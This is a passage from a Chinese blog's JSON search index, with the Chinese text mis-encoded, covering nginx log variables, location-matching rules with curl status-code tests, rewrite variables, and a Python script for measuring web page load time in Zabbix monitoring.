è®¿é—®ç½‘ç«™çš„å®¢æˆ·ç«¯åç§° $time_local : è®¿é—®ç½‘ç«™çš„æ—¶é—´å’Œæ—¶åŒº $request : ç”¨æˆ·çš„httpè¯·æ±‚èµ·å§‹è¡Œä¿¡æ¯(GET/HTTP/1.1) $status : è¿”å›çš„httpçŠ¶æ€ç  $body_bytes_sent : æœåŠ¡å™¨å‘é€ç»™å®¢æˆ·ç«¯çš„æƒ³è¦bodyå­—èŠ‚ $http_referer : è®°å½•æ˜¯ä»é‚£ä¸ªé“¾æ¥è¯·æ±‚è®¿é—®è¿‡æ¥çš„ï¼Œå¯ä»¥æ ¹æ®refererè¿›è¡Œè®¾ç½®é˜²ç›—é“¾ $http_user_agent : è®°å½•è®¿é—®ç½‘ç«™çš„è®¿é—®ä¿¡æ¯ï¼Œæ¯”å¦‚æµè§ˆå™¨ã€æ‰‹æœºå®¢æˆ·ç«¯ç­‰ $http_x_forwarded_for ï¼š æœ‰ä»£ç†æœåŠ¡å™¨çš„æ—¶å€™ï¼Œ è®¾ç½®webèŠ‚ç‚¹è®°å½•å®¢æˆ·ç«¯çš„åœ°å€ï¼Œæ­¤å‚æ•°ç”Ÿæ•ˆéœ€åœ¨ä»£ç†æœåŠ¡å™¨è®¾ç½®x_forwarded_for 2.4. nginx location 2.4.1. location ä½œç”¨ æ ¹æ®ç”¨æˆ·è¯·æ±‚çš„URIæ¥æ‰§è¡Œä¸åŒçš„åº”ç”¨ã€‚ uri åªå¯æ„ä¼šï¼Œä¸å¯è¨€ä¼ çš„ä¸œè¥¿ 2.4.2. location è¯­æ³•: location [=|~|~*|^~] uri { ... } è¯´æ˜: location : æŒ‡ä»¤ [=|~|~*|^~] ï¼šåŒ¹é…æ ‡è¯† = : ç²¾ç¡®åŒ¹é… ~ : ç”¨äºåŒºåˆ†å¤§å°å†™çš„åŒ¹é… ~* : ç”¨äºä¸åŒºåˆ†å¤§å°å†™çš„åŒ¹é… ^~ : å¸¸è§„åŒ¹é…ï¼Œä¸åšæ­£åˆ™éªŒè¯ ! : å–å,å¦‚:!~*â€¦ uri : åŒ¹é…çš„ç½‘å€ {...} : åŒ¹é…uriåè¦æ‰§è¡Œçš„é…ç½®æ®µ ç¤ºä¾‹: location = / { [ configuration A] } location / { [ configuration B] } location /documents/ { [ configuration C] } location ^~ /images/ { [ configuration D] } location ~* \\.(gif|jpg|jpeg)$ { [ configuration E] } ä¸åŒURIå¯¹åº”çš„é…ç½®: ç”¨æˆ·è¯·æ±‚çš„URI å®Œæ•´çš„URLåœ°å€ åŒ¹é…çš„é…ç½® / http://www.example.com/ configuration A /index.html http://www.example.com/ configuration B /documents/index.html http://www.example.com/documents/index.html configuration C /images/1.jpg http://www.example.com/images/1.jpg configuration D /ducoments/1.jpg http://www.example.com/documents/1.jpg configuration E 2.4.3 location è¯­æ³•æµ‹è¯•: location / { return 401; } location =/ { return 402; } location /documents/ { return 403; } location ^~ /images/ { return 404; } location ~* \\.(gif|jpg|jpeg)$ { return 500; } è¯·æ±‚ç»“æœ: [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com 402 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/ 402 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/index.html 401 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/documents/index.html 403 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/images/1.jpg 404 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/documents/1.jpg åŒ¹é…ä¼˜å…ˆçº§: ä¸ç”¨URIåŠç‰¹æ®Šå­—ç¬¦ç»„åˆåŒ¹é…é¡ºåº åŒ¹é…è¯´æ˜ location = / { ç²¾ç¡®åŒ¹é…/ location ^~ /images/ { åŒ¹é…å¸¸è§„å­—ç¬¦ä¸²ï¼Œä¸åšæ­£åˆ™åŒ¹é…æ£€æŸ¥ location ~ \\.(gif|JPG|jpeg)$ { åŒºåˆ†å¤§å°å†™çš„æ­£åˆ™åŒ¹é… location ~* \\.(gif|jpg|jpeg)$ { ä¸åŒºåˆ†å¤§å°å†™çš„æ­£åˆ™åŒ¹é… location /document/ { åŒ¹é…å¸¸è§„å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰æ­£åˆ™åˆ™ä¼˜å…ˆåŒ¹é…æ­£åˆ™ location / { æ‰€æœ‰locationéƒ½ä¸åŒ¹é…åçš„é»˜è®¤åŒ¹é…è§„åˆ™ æ³¨: ä¼˜å…ˆçº§ä¸ºï¼š = \u003e å®Œæ•´è·¯å¾„ \u003e ^~ \u003e ~|~* \u003e éƒ¨åˆ†èµ·å§‹è·¯å¾„ \u003e / 2.5. nginx Rewrite ç”¨äºå®ç°ä¼ªé™æ€ï¼ŒURLæ”¹å†™ï¼Œå¿…é¡»å®‰è£…PCREçš„è½¯ä»¶çš„æ”¯æŒï¼Œnginxç¼–è¯‘é»˜è®¤å®‰è£…Rewriteæ¨¡å— 2.5.1. Rewrite å…¨å±€å˜é‡ - - $remote_addr è·å–å®¢æˆ·ç«¯ip $binary_remote_addr å®¢æˆ·ç«¯ipï¼ˆäºŒè¿›åˆ¶) $remote_port å®¢æˆ·ç«¯portï¼Œå¦‚ï¼š50472 $remote_user å·²ç»ç»è¿‡Auth Basic ModuleéªŒè¯çš„ç”¨æˆ·å $host è¯·æ±‚ä¸»æœºå¤´å­—æ®µï¼Œå¦åˆ™ä¸ºæœåŠ¡å™¨åç§°ï¼Œå¦‚:blog.sakmon.com $request ç”¨æˆ·è¯·æ±‚ä¿¡æ¯ï¼Œå¦‚ï¼šGET ?a=1\u0026b=2 HTTP/1.1 $request_filename å½“å‰è¯·æ±‚çš„æ–‡ä»¶çš„è·¯å¾„åï¼Œç”±rootæˆ–aliaså’ŒURI requestç»„åˆè€Œæˆï¼Œå¦‚ï¼š/2013/81.html $status è¯·æ±‚çš„å“åº”çŠ¶æ€ç ,å¦‚:200 $body_bytes_sent å“åº”æ—¶é€å‡ºçš„bodyå­—èŠ‚æ•°æ•°é‡ã€‚å³ä½¿è¿æ¥ä¸­æ–­ï¼Œè¿™ä¸ªæ•°æ®ä¹Ÿæ˜¯ç²¾ç¡®çš„,å¦‚ï¼š40 $content_length ç­‰äºè¯·æ±‚è¡Œçš„â€œContent_Lengthâ€çš„å€¼ $content_type ç­‰äºè¯·æ±‚è¡Œçš„â€œContent_Typeâ€çš„å€¼ $http_referer å¼•ç”¨åœ°å€ $http_user_agent å®¢æˆ·ç«¯agentä¿¡æ¯,å¦‚ï¼šMozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36 $args ä¸$query_stringç›¸åŒ ç­‰äºå½“ä¸­URLçš„å‚æ•°(GET)ï¼Œå¦‚a=1\u0026b=2 $document_uri ä¸$uriç›¸åŒ è¿™ä¸ªå˜é‡æŒ‡å½“å‰çš„è¯·æ±‚URIï¼Œä¸åŒ…æ‹¬ä»»ä½•å‚æ•°(è§$args) å¦‚:/2013/81.html $document_root é’ˆå¯¹å½“å‰è¯·æ±‚çš„æ ¹è·¯å¾„è®¾ç½®å€¼ $hostname å¦‚ï¼šcentos53.localdomain $http_cookie å®¢æˆ·ç«¯cookieä¿¡æ¯ $cookie_COOKIE cookie COOKIEå˜é‡çš„å€¼ $is_args å¦‚æœæœ‰$argså‚æ•°ï¼Œè¿™ä¸ªå˜é‡ç­‰äºâ€?â€ï¼Œå¦åˆ™ç­‰äºâ€\"ï¼Œç©ºå€¼ï¼Œå¦‚? $limit_rate è¿™ä¸ªå˜é‡å¯ä»¥é™åˆ¶è¿æ¥é€Ÿç‡ï¼Œ0è¡¨ç¤ºä¸é™é€Ÿ $query_string ä¸$argsç›¸åŒ ç­‰äºå½“ä¸­URLçš„å‚æ•°(GET)ï¼Œå¦‚a=1\u0026b=2 $request_body è®°å½•POSTè¿‡æ¥çš„æ•°æ®ä¿¡æ¯ $request_body_file å®¢æˆ·ç«¯è¯·æ±‚ä¸»ä½“ä¿¡æ¯çš„ä¸´æ—¶æ–‡ä»¶å $request_method å®¢æˆ·ç«¯è¯·æ±‚çš„åŠ¨ä½œï¼Œé€šå¸¸ä¸ºGETæˆ–P","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:0:0","tags":["linux","nginx"],"title":"Nginx Location æ¨¡å—ä»‹ç»","uri":"/posts/linux/nginx-location/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"å…¨ç½‘é¡µåŠ è½½æ—¶é—´","date":"2019-02-04","objectID":"/posts/python/%E5%85%A8%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4/","tags":["linux","ç›‘æ§","python"],"title":"Pythonå…¨ç½‘é¡µåŠ è½½æ—¶é—´","uri":"/posts/python/%E5%85%A8%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"æœ¬æ–‡ä»‹ç»çš„æ˜¯ä¸€ä¸ªå…³äºç«™ç‚¹å…¨ç½‘é¡µåŠ è½½æ—¶é—´çš„ä¸€ä¸ªè„šæœ¬,å‰æ®µæ—¶é—´åœ¨ç½‘ç»œä¸Šæ‰¾äº†å¾ˆä¹…å…³äºåœ¨çº¿ç«™ç‚¹å…¨é¡µåŠ è½½çš„æ—¶é—´çš„,ä¸€ç›´æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„,ç¿»è¶Šäº†å¾ˆä¹…çš„githubç»ˆäºæ‰¾åˆ°äº†ä¸€ä¸ªæ¯”è¾ƒé€‚åˆæˆ‘ç°åœ¨éœ€æ±‚çš„ä¸€ä¸ªé¡¹ç›®,äºæ˜¯æ‹¿ä¸‹æ¥ä¿®æ”¹äº†ä¸‹,ç›®å‰è¿™ä¸ªæœ‰ä¸ªé—®é¢˜æ˜¯ä¸èƒ½å¼‚æ­¥åŠ è½½ å‚è€ƒé¡¹ç›®:[https://github.com/donjajo/loady.git] ä¿®æ”¹ä»£ç æäº¤åœ°å€:[https://github.com/0x5c0f/zbx_page_load.git] è„šæœ¬ä¾èµ–çš„é¢å¤–æ¨¡å—: bs4(Beautiful Soup 4.x) æ¨¡å—å®‰è£…: pip3 install bs4 â€‹(æˆ– python3 -m pip install bs4) æ£€æµ‹è„šæœ¬page-load.py #!/usr/bin/env python3 # #UserParameter=custom.page.load[*],/opt/sh/zbx_discover_site/page-load.py $1 # import requests from bs4 import BeautifulSoup import re import urllib.parse import sys from time import time debug=1 class Loady: files = { 'js' : {}, 'css' : {}, 'img' : {} } def __init__( self, url, headers = {} ): if not isinstance( headers, dict ): raise ValueError( 'Headers argument must be dict instance' ) self.url = url self.total_time = 0 self.js = [] self.css = [] self.img = [] self.http_headers = headers self.soup = None self.total_size = 0 def _get( self, tag ): \"\"\"Gets all site additional files and prepares their URL to be loaded\"\"\" # Get current URL data domain_scheme, domain, _, _, _, _ = urllib.parse.urlparse( self.url ) urls = [] if tag == 'script': # Get all script tag with src attribute # print(self.soup.find_all( 'script', { 'src' : re.compile( r'.*' ) } )) tags = self.soup.find_all( 'script', { 'src' : re.compile( r'.*' ) } ) elif tag == 'img': # print(self.soup.find_all( 'img', { 'src' : re.compile( r'.*' ) } )) tags = self.soup.find_all( 'img', { 'src' : re.compile( r'.*' ) } ) # elif tag is 'i': # print(tags = self.soup.find_all('i', {'style': re.compile(r'.*')})) # tags = self.soup.find_all('i', {'style': re.compile(r'.*')}) else: # Get all link tag with rel=stylesheet # print(self.soup.find_all( 'link', { 'rel' : 'stylesheet' } )) tags = self.soup.find_all( 'link', { 'rel' : 'stylesheet' } ) for each_tag in tags: # Get the value of src or href val = each_tag[ 'src' ] if tag == 'script' or tag == 'img' else each_tag[ 'href' ] #val = '' #if tag is 'script' or tag is 'img': # val = each_tag['src'] #else: # val = each_tag['href'] # parse the URL of the gotten URL url = urllib.parse.urlparse( val ) if not url[ 0 ] and url[ 1 ]: # If URL has no scheme but has domain name, we assume it is a URL that supports HTTP(S). We just append the main site scheme to it if not val.startswith(\"//\"): urls.append( '{0}://{1}'.format( domain_scheme, val ) ) else: urls.append( '{0}:{1}'.format( domain_scheme, val ) ) elif not url[ 1 ]: # URL has no domain, its a relative path. Append the domain name to it if not val.startswith(\"/\"): urls.append( '{0}://{1}/{2}'.format( domain_scheme, domain, val ) ) else: urls.append( '{0}://{1}{2}'.format( domain_scheme, domain, val ) ) else: # Its an absolute path, no issues bro! urls.append( val ) if tag == 'script': self.js = urls elif tag == 'img': self.img = urls else: self.css = urls def _load( self, t ): \"\"\"Load the gotten links, check for response time and size. Appends it to self.files object\"\"\" _link_obj = [] if t == 'script': _link_obj = self.js elif t == 'img': _link_obj = self.img else: _link_obj = self.css # for link in ( self.js if t is 'script' else self.css ): for link in (_link_obj): if debug == 1: print(link) try: start = time() r = requests.get( link ) end = time() # Calculate the total time taken to load link response_time = ( end - start ) # Page loaded successfully if r.status_code == 200: # Get the size of page content size = sys.getsizeof(r.content) if t == 'img' else sys.getsizeof(r.text) # Add results to self.files object obj = '' if t == 'style': obj = 'css' elif t == 'img': obj = 'img' else: obj = 'js' self.files[obj][link] = {'byte_size': size, 'load_time': response_time} # Sum up total time to the existing load time self.total_time += response_time self.total_size += size except Exception as e: if debug == 1: print(e,link) continue def get( self ): \"\"\"Loads the main website, calculate response time, page size and get additional files in site\"\"\" start = time() r = requests.get( self.url, headers = self.http_headers ) stop = time() if r.st","date":"2019-02-04","objectID":"/posts/python/%E5%85%A8%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4/:0:0","tags":["linux","ç›‘æ§","python"],"title":"Pythonå…¨ç½‘é¡µåŠ è½½æ—¶é—´","uri":"/posts/python/%E5%85%A8%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4/"}]